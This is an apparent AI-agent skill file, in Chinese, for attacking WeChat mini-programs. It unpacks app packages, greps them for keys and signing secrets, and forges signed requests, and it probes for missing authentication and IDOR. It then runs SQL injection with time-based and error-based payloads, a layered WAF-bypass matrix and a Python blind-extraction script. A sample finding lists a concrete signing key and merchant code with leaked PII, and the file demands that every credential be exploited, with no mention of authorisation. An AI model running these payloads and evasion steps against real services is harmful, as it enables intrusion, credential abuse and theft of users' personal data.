---
name: miniprogram-audit
description: 微信小程序专项审计 — 源码获取、isNeedLogin扫描、凭证提取、平台认证模型识别、动态验证、内嵌SQLi全量测试
triggers:
  - /miniprogram-audit
---

# 微信小程序安全审计

**触发条件**：用户输入 `/miniprogram-audit <目标AppID或描述>` 时激活，或由 `/hack` 在识别到小程序目标时插队调用。

**与 js-audit 的分工**：
- 本 skill 负责小程序**独有工作流**：解包、`isNeedLogin` 扫描、平台认证体系识别
- **本 skill 内嵌 SQLi 快速矩阵**（Step 5.8），不等 sqli skill 接管，第一时间测完全量参数
- 动态验证阶段内嵌铁律2-5（跨接口参数移植 / 多参数组合 / CRUD 全覆盖 / Fuzz）
- 本 skill 产出【端点交接表】后，后续流水线（idor/sqli深度/ssrf/business-logic）正常接管

---

## ⚡ 三条铁律（每步执行前默读，不跳过）

```
铁律A — 参数无语义偏见
  openId / unionId / appid / merchantCode / card_no / session_key
  这些"看起来是系统生成字段"的参数，与任意普通字符串参数等同对待。
  一旦攻击者控制了签名密钥或认证绕过入口，这些字段的值完全可控。
  → 全部进入 SQLi 候选矩阵，不跳过，不标注"低优先级"。

铁律B — WAF 拦截 ≠ 注入不存在
  SLEEP() 被拦 → 立即换 BENCHMARK(N,MD5(1))
  UNION SELECT 被拦 → 立即换报错注入（extractvalue/updatexml）
  报错注入被拦 → 立即换布尔盲注
  函数名被拦 → 立即换大小写混淆/内联注释/编码变体
  任何一个 payload 被拦 → 不是"无注入"的证据，是 WAF 在工作的证据。
  必须穷举分层绕过矩阵，停止条件是"所有绕过技术均无效"而非"第一个 payload 被拦"。

铁律C — 第一个注入确认 → 全量横扫
  在同一后端，SQL 拼接是开发习惯，不是个例。
  第一个参数注入确认 → 立即把同批所有接口的所有字符串参数加入矩阵重测。
  不允许"确认一个注入点后直接去写报告"。
```

---

## 输出目标

- [ ] `.wxapkg` 解包 + 所有分包 + 引用链闭合
- [ ] `isNeedLogin:false` 端点完整列表（含分包）
- [ ] 硬编码凭证 / 内网 IP / API Key / 签名密钥 + **完整利用链**
- [ ] **全量参数清单**（含隐藏参数、extConfig参数、错误推断参数）
- [ ] 平台认证体系识别（JD SSO / 微信 openId / 自建 token / 签名机制）
- [ ] **SQLi 扫描矩阵**（全端点 × 全参数 × JSON+form × WAF绕过记录）
- [ ] 客户端可控 Header 列表（含 IDOR 风险评级）
- [ ] 跨接口参数移植记录（每个接口一条）
- [ ] 动态验证结果（每个端点 × 多参数组合 × ≥20 变体）
- [ ] 【端点交接表】（标准格式，Write 到文件）

---

## Step 0: 源码获取

### 方式 A — PC 微信本地缓存（首选）

```
路径规律（macOS）：
  ~/Library/Containers/com.tencent.xinWeChat/Data/Library/Application Support/
  com.tencent.xinWeChat/2.0b4.0.9/Accounts/<accountHash>/MicroMsg/AppCache/applet/<AppID>/

路径规律（Windows）：
  %AppData%\Tencent\WeChat\applet\<AppID>\

文件结构：
  __APP__.wxapkg          ← 主包（必须）
  __FULL__.wxapkg         ← 完整包（部分小程序）
  <subpackageName>.wxapkg ← 分包（按需解包）
```

```bash
npm install -g wxapkg-unpacker
wxapkg-unpacker __APP__.wxapkg -o ./unpacked/
# 或支持加密包：
unveilr __APP__.wxapkg
```

### 方式 B — 抓包获取

```
Charles/mitmproxy → 代理手机 → 打开小程序 → 拦截 servicewechat.com 的 .wxapkg 下载
注意：加密独立分包需 root 设备提取解密密钥
```

### 引用链追踪（小程序版）

小程序的懒加载路径与 SPA 不同，必须追踪：

```bash
# 1. 页面跳转（产生新的 JS 执行路径）
grep -n "wx\.navigateTo\|wx\.redirectTo\|wx\.switchTab\|wx\.reLaunch" app-service.js | head -30

# 2. 插件/第三方包引用
grep -n "requirePlugin\|requireMiniProgram\|plugin://" app-service.js

# 3. 分包预加载声明
cat unpacked/app.json | python3 -m json.tool | grep -A5 "preloadRule\|subPackages\|subpackages"

# 4. App.onLaunch / App.onShow 中的初始化调用（高价值：常含无认证接口调用）
grep -n "onLaunch\|onShow\|globalData" app-service.js | head -20

# 5. 全局组件中的接口调用（跨页面共享，覆盖面广）
grep -rn "isNeedLogin\|wx\.request" unpacked/components/ 2>/dev/null | head -20
```

**追踪规则**：每发现新页面路径 → 检查该页面对应的 JS 是否在分包中 → 对分包重复 Step 1-4。

> ⛔ **进入 Step 1 前自问**
> ```
> □ 是否获取到 app-service.js（主包）？
> □ app.json 中声明的所有分包是否单独解包？
> □ wx.navigateTo 的目标页面是否检查了对应分包？
> □ 引用链是否已闭合（无新 JS 产生）？
> ```

---

## Step 1: isNeedLogin 扫描 [最高 ROI — 小程序专属]

**语义**：`isNeedLogin:false` 时，请求封装模块不在 Cookie 中注入会话凭证（`pt_key`/`lsySession`/`lsyPin`），只保留 `appId`/`platform`/`channel` 等公共字段。

**注意**：isNeedLogin:false 是客户端行为，不代表服务端无认证——需动态验证。

```bash
# 基础扫描（主包 + 所有分包）
for f in $(find unpacked/ -name "app-service.js"); do
  echo "=== $f ===$(grep -c 'isNeedLogin.*false' $f 2>/dev/null) 个 ==="
  grep -n "isNeedLogin.*false" $f
done

# 提取每个命中行的上下文（url + functionId + data 参数）
grep -n "isNeedLogin.*false" app-service.js | while IFS=: read linenum rest; do
  echo "--- Line $linenum ---"
  sed -n "$((linenum-15)),$((linenum+5))p" app-service.js
done

# 同时扫描完全不携带 isNeedLogin 字段的接口（默认行为可能也无认证）
grep -n "wx\.request\b" app-service.js | grep -v "isNeedLogin" | head -20
```

### isNeedLogin:false 危险度分级

| 场景 | 危险度 | 说明 |
|------|--------|------|
| `isNeedLogin:false` + 写操作（recharge/submit/update/add/delete） | P0 | 未认证写操作，最高优先 |
| `isNeedLogin:false` + body 含用户标识符（pin/userId/openId/accountId） | P0 | IDOR 候选，优先验证 |
| `isNeedLogin:false` + 读取个人数据（address/member/order/balance） | P1 | 未授权读取 |
| `isNeedLogin:false` + 只读公共数据（shop/config/list/banner） | P3 | 低危，信息泄露 |

### 硬编码参数检测

```bash
# pin 硬编码（IDOR 触发点）
grep -n "pin.*:.*[0-9]\|{pin:\|\"pin\":" app-service.js

# 固定 userId / accountId
grep -n "userId.*:.*[0-9]\|accountId.*:.*['\"]" app-service.js

# 硬编码 openId / unionId（非 getStorage 读取的）
grep -n "openId\|unionId" app-service.js | grep -v "getStorage\|wx\.\|Storage"
```

> ⛔ **进入 Step 2 前自问**
> ```
> □ 主包 + 所有分包的 isNeedLogin:false 是否全量扫描？
> □ 每个命中行是否查看了前后 15 行（确认 url/functionId/data）？
> □ 含用户标识符参数的是否标记 P0-IDOR？
> □ 写操作端点是否标记 P0？
> □ 不含 isNeedLogin 字段的 wx.request 调用是否单独列出？
> ```

---

## Step 2: 平台认证体系识别

```bash
# JD SSO
grep -n "pt_key\|lsySession\|lsyPin\|jnosPin\|jd_" app-service.js | head -20
# 微信 openId
grep -n "openId\|unionId\|code2Session\|wx\.login" app-service.js | head -20
# 自建 token
grep -n "Authorization\|Bearer\|X-Token\|access_token" app-service.js | head -20
# 本地存储中的 session/token
grep -n "getStorageSync\|setStorageSync" app-service.js | grep -i "session\|token\|key" | head -20
# 签名机制（client-sign / sign / signature）— 发现即进 Step 3 优先处理
grep -n "client-sign\|client_sign\|sign.*md5\|md5.*sign\|hmac\|hex_md5" app-service.js | head -20
# extConfig（常含签名密钥）
grep -n "extConfig\|getExtConfig\|getExtConfigSync" app-service.js | head -20
```

### Cookie/Header 构造逻辑提取

```bash
# 找到请求封装模块（isNeedLogin 判断逻辑所在）
grep -n "isNeedLogin\|Cookie.*platform\|header.*appId" app-service.js | head -10

# 记录两个 Cookie 版本：
# isNeedLogin:true  → 完整字段（pt_key/lsySession/lsyPin/x-jnos-token 等）
# isNeedLogin:false → 裁剪字段（仅 appId/platform/channel）
```

### 客户端可控 Header 检测

```bash
grep -n "wx\.getStorageSync" app-service.js | grep -i "account\|id\|shop\|user\|tenant"
grep -n "Jnos-User-\|X-Shop-\|X-Account-\|X-Tenant-\|X-User-\|client-id\|merchant" app-service.js
```

**每个 Header 必须记录：**
```
Header 名: client-id / Jnos-User-AccountId
值来源: extConfig.merchantCode / wx.getStorageSync("jnos-account-id")
写入时机: 签名计算函数 v() / App.onLaunch()
语义: 商户编号（全局唯一）/ 店铺级 AccountId
IDOR 风险: 若为 user-level → 高
SQLi 风险: 若值可控且进入 DB 查询 → 高（⚠️ 别忽略 Header 参数的注入面）
```

> ⛔ **进入 Step 3 前自问**
> ```
> □ 认证体系类型确认（JD SSO / 微信 openId / 自建 token / 签名机制）？
> □ 签名机制是否存在（grep client-sign/sign/hmac）？
> □ isNeedLogin:false 时实际发送的 Cookie 字段列表确认？
> □ 所有客户端可控 Header 列出（含 SQLi 风险评估）？
> ```

---

## Step 3: 硬编码敏感信息提取 + 签名密钥利用链

```bash
# API Key / 第三方密钥
grep -iEn "api[_-]?key\s*[:=]\s*['\"][A-Za-z0-9_\-]{8,}" app-service.js
grep -iEn "secret\s*[:=]\s*['\"][A-Za-z0-9_\-]{8,}" app-service.js

# 地图 / 支付类 Key
grep -n "AppKey\|appkey\|maps\.qq\.com\|maps\.googleapis\|amap\.com" app-service.js

# 内网 IP（RFC1918）
grep -En "192\.168\.[0-9]+\.[0-9]+|10\.[0-9]+\.[0-9]+\.[0-9]+|172\.(1[6-9]|2[0-9]|3[0-1])\." app-service.js

# AK/SK（阿里云/腾讯云/AWS）
grep -iEn "AccessKeyId|SecretAccessKey|LTAI|AKID" app-service.js

# 数据库连接串
grep -iEn "mysql://|mongodb://|redis://|jdbc:" app-service.js

# 签名密钥（重点：常藏在 extConfig 或全局配置对象）
grep -iEn "sign[_-]?key\|sign[_-]?secret\|hmac[_-]?key\|api[_-]?sign\|secretKey\|\.key\s*[=:]\s*['\"][a-z0-9]{16,}" app-service.js
grep -n "extConfig\b" app-service.js | head -5  # 找到 extConfig 赋值行，向下展开读取完整内容

# 微信 AppSecret / 支付密钥
grep -n "appSecret\|app_secret\|mchKey\|payKey" app-service.js

# merchantCode / merchantId（常与签名密钥配套）
grep -iEn "merchantCode\|merchant_code\|merchantId\|merchant_id" app-service.js | head -10
```

### ⚡ 签名密钥发现后的强制利用链（不得跳过）

发现任何签名密钥（`key`/`secret`/`sign_key`/extConfig中的密钥）后，**必须原地完成以下全部步骤再继续**：

```
Step A: 提取签名算法（从 JS 读签名构造函数）
  → 搜索 sign/md5/hmac 附近的字符串拼接逻辑
  → 记录公式，例：MD5(merchantCode + timestamp + key + JSON.stringify(body))

Step B: 本地复现签名，构造第一个合法请求
  → 用最简单的 GET 类端点验证签名计算正确性
  → 确认 client-id / client-time / client-sign 三头格式

Step C: 用合法签名访问 /member 或 /user 类接口
  → 确认数据可访问 → 记录响应字段池（每个字段都是 SQLi/IDOR 候选）

Step D: 建立 SQLi 候选矩阵（此时立即建立，不等 Step 5）
  → 把所有端点的所有字符串参数（含 openId/unionId/appid/card_no/phone 等）
    全部加入矩阵，标注为"签名门控—密钥已知—实际零认证"
  → ⚠️ 不因参数"看起来是系统生成的 ID"而跳过

Step E: 枚举所有已知服务路径
  → 从 JS 提取所有 baseURL / 路径前缀
  → 对每个前缀枚举至少5种子路径（/member /order /coupon /pay /login）
  → 404不等于服务不存在，穷举路径变体
```

**每个发现必须记录：**
```
类型: 请求签名密钥
值: c21a0fd9369afd36c94221e3744e65d3
位置: app-service.js line 8858, extConfig.key
算法: MD5_UPPERCASE(merchantCode + timestamp + key + JSON.stringify(body))
merchantCode: EW_N2826460478
利用状态: ✅ 签名已复现 → POST /member 200 + PII
SQLi候选矩阵: 已建立（端点7个，字符串参数14个）
```

> ⛔ **进入 Step 4 前自问**
> ```
> □ 所有 grep 命令是否执行（不只执行部分）？
> □ 发现 AK/SK → 是否立即测试权限？
> □ 发现签名密钥 → 是否完成 Step A-E 全部？
> □ SQLi 候选矩阵是否已建立（不等 Step 5）？
> □ 凭证利用链是否闭合（禁止带着未利用的凭证推进）？
> ```

---

## Step 3.5: 全量隐藏参数挖掘 [NEW — 必做]

**隐藏参数是注入面的盲区，不挖掘 = 必然漏测。**

### 来源 A: extConfig 完整字段

```bash
# 找到 extConfig 赋值并展开所有字段
grep -n "extConfig\b" app-service.js | head -5
# 向上下展开50行，记录所有 key/value 对
sed -n '8840,8900p' app-service.js  # 替换为实际行号
```

extConfig 常见隐藏字段：
```
key / secretKey / sign_key     → 签名密钥（直接进 Step 3 利用链）
merchantCode / merchant_code   → 商户号（签名组件）
appId / appSecret              → 微信应用密钥
env / environment              → 环境标识（可能影响验证严格度）
baseUrl / apiHost              → 实际接口 base（可能与猜测不同）
```

### 来源 B: 错误响应推断隐藏参数

```bash
# 对每个端点发送空 body 请求，从错误信息推断必填参数
curl -s -X POST "https://target.com/endpoint" \
  -H "Content-Type: application/json" \
  -d '{}'
# 响应 "xxx不能为空" / "missing field xxx" → xxx 是真实参数名
# 响应 "参数错误" 无详情 → 尝试常见参数名枚举
```

**常见隐藏参数名模式（必须全量尝试）：**
```
身份类:  open_id / openid / union_id / unionid / user_id / member_id
         account_id / wechat_id / wx_id / phone / mobile / card_no
         session_key / access_token / refresh_token
业务类:  order_id / trade_no / merchant_no / shop_id / store_id
         coupon_id / activity_id / goods_id / sku_id
控制类:  page / limit / offset / pageNo / pageSize / size
         sort / order / asc / desc / filter / keyword / status
元数据:  source / channel / platform / version / appver / terminal
         ts / timestamp / nonce / sign / signature / token
```

### 来源 C: 响应字段反推参数

每收到一个接口响应，**立刻把响应中的每个字段名**作为其他接口的参数候选：

```
GET /member 响应:
  {member_id, open_id, union_id, wechat_card_no, member_balance, coupon_cnt}
  ↓ 每个字段名 → 尝试作为其他接口的 body 参数
  open_id    → /member/coupon/list body:open_id     ← SQLi 候选 [铁律A]
  union_id   → /corp/wechat/groupchat/query body:unionid  ← SQLi 候选 [铁律A]
  member_id  → /order/list body:member_id           ← IDOR 候选
```

### 来源 D: URL 模板参数（路径参数）

```bash
# 捕获所有含 ${变量} 的路径模板
grep -oE '`(/[^`]*\$\{[^}]+\}[^`]*)`' app-service.js
# 捕获 /path/{param} 风格
grep -oE '"(/[a-zA-Z0-9_/-]*\{[a-zA-Z_]+\}[a-zA-Z0-9_/-]*)"' app-service.js
# 每个路径参数 → 独立加入 SQLi 候选矩阵（路径参数注入是高频漏洞）
```

### 来源 E: 注释和死代码中的参数

```bash
# 被注释掉的接口调用（可能是已废弃但服务端仍接受的参数）
grep -n "//.*url\|//.*path\|//.*api\|//.*POST\|//.*fetch" app-service.js | head -20
# 条件分支中永远不执行的参数（可能仍被服务端处理）
grep -n "if.*false\|if.*0 ==" app-service.js | head -10
```

> ⛔ **进入 Step 4 前必答**
> ```
> □ extConfig 所有字段是否提取完毕？
> □ 至少对 3 个端点发送空 body 并记录了错误信息中的参数名？
> □ 所有响应字段池是否建立（每个接口一条记录）？
> □ 路径参数是否单独提取并加入矩阵？
> ```

---

## Step 4: 端点枚举（主包 + 分包 + CRUD 全量）

### functionId 路由模式（CBFF/JNOS 网关）

```bash
# 提取所有 functionId + url + isNeedLogin 三元组
grep -n "functionId\|isNeedLogin\|url.*api" app-service.js | head -100

# 按 functionId 去重（全量）
grep -oEn "functionId['\"\s:]+['\"]([a-zA-Z_0-9]+)['\"]" app-service.js | \
  grep -oE "['\"][a-zA-Z_][a-zA-Z_0-9]+['\"]" | tr -d "'\"" | sort -u

# 补充：直接 REST 路径（非 functionId 路由的接口）
grep -oEn "(url|path)\s*:\s*['\"][/a-zA-Z0-9_\-\.{}]+['\"]" app-service.js | \
  grep -oE "['\"][/][^'\"]+['\"]" | tr -d "'\"" | sort -u
```

### CRUD 全量枚举规则

**发现任何一个端点后，必须枚举同服务的全部方法（从 JS grep，不猜测）：**

```
发现 /member/coupon/list → 立即 grep "coupon" app-service.js → 发现:
  /member/coupon/use         ← 写操作，优先测
  /member/coupon/receive     ← 写操作
  /member/coupon/detail      ← IDOR 候选
  /member/coupon/cancel      ← 写操作

发现 query_address_list → grep "address" → 发现:
  add_address / update_address / delete_address

原则：list/query 端点 → 立即找对应 add/update/delete
     detail 端点 → 立即找对应 edit/delete/export
```

### 分包全量

```bash
cat unpacked/app.json | python3 -m json.tool | grep -A2 "subpackages\|subPackages"

for pkg_dir in unpacked/pages* unpacked/sub*; do
  for f in "$pkg_dir/app-service.js" "$pkg_dir"/*.js; do
    [ -f "$f" ] && echo "=== $f ===" && \
      grep -c "isNeedLogin.*false\|functionId\|wx\.request" "$f" 2>/dev/null
  done
done
```

### ⚡ SQLi 候选矩阵同步构建（Step 4 完成时必须产出）

**在枚举端点的同时，同步构建 SQLi 候选矩阵，不等 Step 5：**

```
矩阵格式（每行一个参数）：
  [端点] | [参数名] | [参数类型] | [Content-Type已测] | [测试状态] | [信号]

填写规则：
  ① 所有字符串类型参数全部加入，不论语义（包含 openId/unionId/appid）
  ② 数字类型参数也加入（数字上下文注入 AND 1=1）
  ③ 路径参数单独一行（/order/{id} → id 单独列）
  ④ Header 参数也加入（client-id / merchant-code 等）
  ⑤ 认证状态标注：无认证 / 需签名(密钥已知) / 需token

示例：
  /member/coupon/list | open_id(str)     | JSON | ✗ | -  ← 铁律A：必须测
  /member/coupon/list | open_id(str)     | form | ✗ | -
  /corp/groupchat     | unionid(str)     | JSON | ✗ | -  ← 铁律A：必须测
  /market/recharge    | card_no(str)     | JSON | ✗ | -
  /wechat/login       | appid(str)       | JSON | ✗ | -  ← 零认证！最高优先
  /wechat/login       | jscode(str)      | JSON | ✗ | -
  /order/{id}         | id(path/num)     | -    | ✗ | -
```

> ⛔ **进入 Step 5 前自问**
> ```
> □ 主包 + 所有分包端点合并完成？
> □ 每个发现的服务，同服务 CRUD 是否全量枚举？
> □ 每个 isNeedLogin:false 的 functionId 是否在端点列表中？
> □ SQLi 候选矩阵是否已建立（每个字符串参数都在矩阵中）？
> □ 零认证端点（/login /auth 类无认证路径）是否排在矩阵首位？
> ```

---

## Step 5: 动态验证 — 多参数组合 × Fuzz [核心]

### 5.1 基线建立

每个端点必须先建立基线（有认证 + 正确参数），再做变体测试：

```bash
# 基线请求（isNeedLogin:true，有效 pt_key/token/签名）
curl -s 'https://{gateway}/?functionId={functionId}' \
  -H 'Cookie: pt_key=<valid>; lsySession=<valid>; appId={wxAppId}; platform=5; channel=2' \
  -H 'Jnos-User-AccountId: {accountId}' \
  -d '{"appid":"{appid}","functionId":"{functionId}","body":"{\"正常参数\":\"正常值\"}"}'
# 记录：响应字段列表、code值、数据条数、响应时间基线
```

### 5.2 认证维度变体（每个端点必测4种）

```bash
# 变体1: 完全无认证（isNeedLogin:false 场景复原）
-H 'Cookie: appId={wxAppId}; platform=5; channel=2'

# 变体2: 空 token
-H 'Cookie: pt_key=; lsySession=; appId={wxAppId}; platform=5; channel=2'

# 变体3: 伪造 token（随机字符串）
-H 'Cookie: pt_key=FAKE_TOKEN_12345; appId={wxAppId}; platform=5; channel=2'

# 变体4: 他人 token（低权限账号访问高权限端点）
-H 'Cookie: pt_key=<账号B的pt_key>; ...'
```

### 5.3 参数位置变体（每个参数必测4种位置）

```bash
# 位置A: body JSON（嵌套）
-d '{"appid":"x","functionId":"x","body":"{\"open_id\":\"TARGET_VAL\"}"}'
# 位置B: query string
'?open_id=TARGET_VAL&functionId={functionId}'
# 位置C: Header
-H 'X-Open-Id: TARGET_VAL'
# 位置D: body 根层（非嵌套）
-d '{"open_id":"TARGET_VAL","functionId":"{functionId}"}'
```

### 5.4 值域变体（每个关键参数 ≥ 20 变体）

**用户标识符类（pin/userId/openId/accountId/unionId）：**
```
变体1:  自己的 ID（baseline）
变体2:  他人 ID（IDOR 核心）
变体3:  整数 1
变体4:  整数 0 / -1 / 99999999
变体5:  空字符串 ""
变体6:  null
变体7:  数组 ["self_id"]
变体8:  SQL探针 ' OR '1'='1
变体9:  SQL探针 ' AND SLEEP(3)-- （记录响应时间）
变体10: SQL探针 ' AND BENCHMARK(5000000,MD5(1))-- （WAF绕过备选）
变体11: 超长字符串（256字节）
变体12: URL编码变体 jd_5dc895%62f32bfd
变体13: 格式枚举（jd_ 前缀/wx 前缀/o 前缀等）
变体14: 管理员 ID（从响应中获取）
变体15: 布尔 true / false
变体16: Unicode \u0035dc895
变体17: 多值 ["id1","id2"]
变体18: SSTI 探针 {{7*7}}
变体19: 注入闭合探针 '; 或 ") 或 `
变体20: 换行/特殊字符 \n\r\t%00
```

### 5.5 跨接口参数移植（每个响应必做）

```
每收到一个接口响应 → 立刻提取所有字段名和值：
  id / userId / pin / openId / orgId / shopId / orderId / addressId / token
  open_id / union_id / member_id / card_no / phone / wechat_card_no ...
  ↓
字段名 → 作为其他接口的参数名候选，逐一测试
ID 值  → 记入IDOR候选池
字段名 → ⚡ 特别检查：是否与 SQLi 矩阵中已知注入参数同名？→ 立即测该参数

强制记录格式（每个接口必须产出）：
  接口: /member
  响应字段池: member_id(数字), open_id(字符串), union_id(字符串), wechat_card_no(字符串)
  IDOR候选: member_id → /order/list body:member_id
  参数移植: open_id → /member/coupon/list body:open_id [铁律A：已加入SQLi矩阵]
  注入候选: open_id(字符串), union_id(字符串), wechat_card_no(字符串) → 全部进SQLi矩阵
```

### 5.6 响应判断

| 响应 | 含义 | 下一步 |
|------|------|--------|
| `code:0` + 业务数据（无认证时） | 后端无独立鉴权 | P0/P1，立即进 validate |
| `code:0` + 他人数据（换 ID 后） | IDOR 确认 | 多ID验证（≥3个），进 validate |
| `code:504 "token失效"` + `isFromGateway:true` | 网关层已修复 | 记录已修复，存档 |
| `code:504 "token失效"` 无 isFromGateway | 后端服务拒绝 | 降级 Info |
| `code:400` + `{"msg":"失败"}` 无具体信息 | **SQL语法破坏信号** | 立即进 Step 5.8 SQLi矩阵 |
| `code:50008` 参数错误（无认证时触发） | 认证通过但缺参数 | 若无 pt_key 触发 = 认证绕过，补充测试 |
| 响应时间基线 + N > baseline × 2 | 时间盲注候选 | 立即进 Step 5.8 SQLi矩阵，BENCHMARK替代验证 |
| `code:401`/`403` | 标准认证失败 | 记录有防护 |

### 5.7 多 ID 验证（IDOR 确认前必做）

```bash
for target_id in <id1> <id2> <id3>; do
  echo "=== $target_id ==="
  curl -s ... -d "{...\"member_id\":\"$target_id\"...}"
done
# 3次均返回对应用户数据 = 系统性 IDOR 确认
```

---

## Step 5.8: 内嵌 SQLi 快速矩阵 [NEW — 必须原地执行，不转交 sqli skill]

**触发时机**：不等 Step 6，在 Step 5 动态验证期间，对矩阵中每个参数实时执行。

**核心原则**：信号优先于绕过。先确认注入面，再选绕过方案。

### Phase A: 闭合探针（每个字符串参数，两种格式各测）

```bash
# 格式1: JSON
curl -s -X POST "https://target.com/endpoint" \
  -H "Content-Type: application/json" \
  -H "<签名头>" \
  -d '{"<param>": "<normal_val>'"'"'"}'
# 格式2: form-urlencoded（必须各自独立测，JSON无信号 ≠ 无注入）
curl -s -X POST "https://target.com/endpoint" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "<param>=<normal_val>'"
```

**闭合信号判断（不只看 HTTP 状态码）：**
```
□ HTTP 400 / 500 → 明显语法错误信号
□ code/errorCode 字段值变化（例：200→400 / 0→1001）← 高频隐性信号
□ message 字段含 "失败"/"异常"/"系统错误"（无具体说明）← SQL语法破坏的典型掩盖响应
□ 响应体长度变化 ≥20%
□ 正常响应含数据，注入后数据消失（AND条件破坏了WHERE）
任何一种 → 进 Phase B
```

### Phase B: 时间盲注验证（信号确认后）

```bash
# 第一选择：SLEEP（看WAF是否拦截）
payload: "' AND SLEEP(3)-- "
# 如被WAF拦截（连接重置/444/WAF拦截页）→ 立即换 Phase B.2

# 第二选择：BENCHMARK（WAF常忘记屏蔽）
payload: "' AND IF(1=1,BENCHMARK(5000000,MD5(1)),0) AND '1'='1"
# 关键：BENCHMARK 必须嵌套在 IF() 中，否则无条件执行无法做布尔对比

# 线性验证（排除网络抖动，必须做）
# 5M → 记录延迟 Δ1
# 20M → 记录延迟 Δ2
# Δ2/Δ1 ≈ 4 = 时间注入确认，非网络抖动

# 三次重复测量（每组3次取平均）
for i in 1 2 3; do
  time curl -s -X POST "..." -d '{"<param>":"' AND IF(1=1,BENCHMARK(5000000,MD5(1)),0) AND '1'='1'"}'
done
# 判断：avg(IF(1=1)) - avg(IF(1=2)) > 0.5s = 注入确认
```

### Phase C: WAF 系统性绕过（SLEEP 和 BENCHMARK 都被拦时）

**第一步：诊断被拦的最小单元（30秒定方向）**
```
逐一发送：
  '           被拦？→ 单引号本身被过滤（换编码层）
  SLEEP       被拦？→ 关键字黑名单（换等价函数）
  BENCHMARK   被拦？→ 函数名黑名单（换大小写/注释插入）
  IF(         被拦？→ 条件表达式结构（换CASE WHEN）
  AND         被拦？→ 逻辑操作符（换 &&）
定位最小被拦单元 → 直接跳到对应绕过层
```

**分层绕过矩阵（按命中率排序，逐层尝试）：**

```
层A — 等价函数替换（最高命中率）：
  SLEEP(3)           → BENCHMARK(5000000,MD5(1))          ← 必试
  SLEEP(3)           → BENCHMARK(20000000,MD5(1))          ← 线性验证用
  IF(c,a,b)          → CASE WHEN c THEN a ELSE b END
  AND                → &&（URL编码 %26%26）
  OR                 → ||（URL编码 %7c%7c）
  SUBSTRING()        → MID() / SUBSTR()
  ASCII()            → ORD()

层B — 关键字混淆：
  BENCHMARK          → BeNcHmArK（大小写混合）
  BENCHMARK          → BEN/**/CHMARK（内联注释插入）
  BENCHMARK(5M,MD5(1)) → BENCHMARK(5000000,MD5(1))（写全避免缩写匹配）
  SLEEP              → SL%0aEEP（换行符插入）
  AND                → AN%0aD

层C — 编码变体：
  单引号 '           → %27（URL编码）
  单引号 '           → %2527（双重URL编码）
  空格               → %09（Tab）/ %0a（LF）/ %0c（FF）/ /**/ （注释）

层D — 结构混淆：
  IF(1=1,BENCH,0)    → (CASE WHEN(1=1)THEN(BENCHMARK(5M,MD5(1)))ELSE(0)END)
  IF(1=1,BENCH,0)    → IF((1)=(1),(BENCHMARK(5000000,MD5(1))),(0))

层E — Content-Type切换（WAF对不同格式规则不同）：
  JSON → form-urlencoded → multipart/form-data

层F — 注入类型切换（时间盲注全失败时）：
  → 报错注入：' AND extractvalue(1,concat(0x7e,database()))--
  → 报错注入：' AND updatexml(1,concat(0x7e,version()),1)--
  → 布尔盲注：' AND (SELECT SUBSTR(database(),1,1))='c'--
  → 十六进制比较（无需字符串函数）：
    ' AND IF(database()=0x636c75625f6f70656e,BENCHMARK(5M,MD5(1)),0) AND '1'='1
```

**停止条件**：以上所有层全部尝试，且每层 ≥3 变体无信号 → 才可标注"当前注入点 WAF 无法绕过"。

### Phase D: 数据提取（时间盲注确认后）

```python
# 逐字符提取数据库名（通用模板）
import hashlib, json, time, subprocess

BASE_URL = 'https://target.com/endpoint'
THRESHOLD = 0.55  # baseline + BENCHMARK延迟 / 2
CHAR_SET = '_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'

def test_char(pos, char_ord, param_name, normal_val):
    payload = f"{normal_val}' AND IF(ASCII(SUBSTR(database(),{pos},1))={char_ord},BENCHMARK(5000000,MD5(1)),0) AND '1'='1"
    # 构造签名（如需要）
    body = {param_name: payload}
    # ... 签名计算 ...
    t0 = time.time()
    subprocess.run(['curl', '-s', '-X', 'POST', BASE_URL,
                    '-H', 'Content-Type: application/json',
                    '-d', json.dumps(body)],
                   capture_output=True, timeout=15)
    return time.time() - t0

result = ''
for pos in range(1, 30):
    for c in CHAR_SET:
        if test_char(pos, ord(c), '<param>', '<normal_val>') > THRESHOLD:
            result += c; break
    else:
        break
print(f"database: '{result}'")
```

### Phase E: 首漏扩展（铁律C落地）

```
第一个参数注入确认 →
  立即把 SQLi 矩阵中所有 [测试状态=✗] 的行全部执行
  → 同一开发习惯：一处 SQL 拼接 = 所有字符串参数可能都在拼接
  → 特别关注：openId / unionId / appid / card_no / phone
    这些"看起来是系统值"的参数往往被开发者自己也不过滤

不同数据库信号（注意：同一后端可能有多个数据库）：
  /wechat/login → appid → lt_weixin（微信数据库）
  /member/coupon/list → open_id → club_open（业务数据库）
  → 两个注入点 = 两个独立数据库 = 分别提取，分别报告
```

> ⛔ **进入 Step 6 前自问**
> ```
> □ SQLi 矩阵中每个参数都已执行 Phase A（JSON + form 两种格式）？
> □ 有信号的参数是否执行了 Phase B BENCHMARK 验证（3次重复测量）？
> □ SLEEP 被拦后是否立即尝试了 BENCHMARK（铁律B）？
> □ 时间注入确认后是否立即执行了 Phase E 首漏扩展（铁律C）？
> □ 每个端点是否完成了4种认证维度变体？
> □ 每个关键参数是否完成了 ≥ 20 变体？
> □ 每个接口的响应字段是否提取并作为其他接口的参数候选？
> □ IDOR 确认是否经过多 ID 验证（≥ 3 个）？
> □ 发现 code:0 后，同服务写操作（add/update/delete）是否立即测试？
> ```

---

## Step 6: 首漏扩展（任何端点确认漏洞后立即触发）

```
确认一个 isNeedLogin:false 端点无后端鉴权 →
  立即对交接表中所有其他 isNeedLogin:false 端点重放相同请求模式
  → 同一开发团队的鉴权缺陷高度重复

确认一个 IDOR（body 参数覆盖身份）→
  对所有含用户标识符参数的端点重放相同技巧
  → 遍历 address/order/member/balance/coupon 等所有个人数据端点

确认一个 SQLi（任意参数）→
  立即把矩阵中所有 [测试状态=✗] 的参数全部执行 Phase A+B
  → 特别关注：同接口的其他参数、同批未测的"系统字段"参数

确认一个硬编码凭证可用 →
  枚举该凭证对所有已知服务/端点的权限范围
  → 禁止带着未利用的凭证切换步骤
```

---

## 完成前：强制漏测自查门 [禁止跳过]

**进入端点交接表输出前，必须逐条回答：**

```
□ [引用链] wx.navigateTo/redirectTo 的所有目标页面对应的分包是否检查过？
  → 没有 → 回去追踪，条件分支页面的接口是高价值盲区

□ [isNeedLogin 全量] 主包 + 所有分包的 isNeedLogin:false 是否合并？
  → 有分包未扫描 → 回去补

